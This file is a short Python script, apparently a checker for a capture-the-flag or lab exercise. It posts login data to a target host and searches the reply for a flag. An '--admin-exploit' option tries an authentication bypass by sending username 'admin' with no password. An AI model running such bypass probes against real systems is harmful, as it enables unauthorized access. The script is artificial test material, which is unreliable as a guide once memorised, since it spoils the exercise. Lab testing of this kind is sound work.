import argparse
import json
import re
import urllib.error
import urllib.parse
import urllib.request

FLAG = re.compile(r"[A-Z0-9]{35}=")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--username", default="alice")
    parser.add_argument("--password")
    parser.add_argument("--admin-exploit", action="store_true")
    args = parser.parse_args()
    values = {"username": "admin" if args.admin_exploit else args.username}
    if args.password is not None:
        values["password"] = args.password
    request = urllib.request.Request(f"http://{args.host}:{args.port}/login", data=urllib.parse.urlencode(values).encode(), method="POST")
    try:
        response = urllib.request.urlopen(request, timeout=3)
        status, body = response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        status, body = error.code, error.read().decode("utf-8", "replace")
    except Exception as error:
        print(json.dumps({"ok": False, "status": 0, "flag_found": False, "flag_format_valid": False, "connection_error": type(error).__name__}))
        return
    found = bool(FLAG.search(body))
    print(json.dumps({"ok": 200 <= status < 300, "status": status, "flag_found": found, "flag_format_valid": found}))


if __name__ == "__main__":
    main()
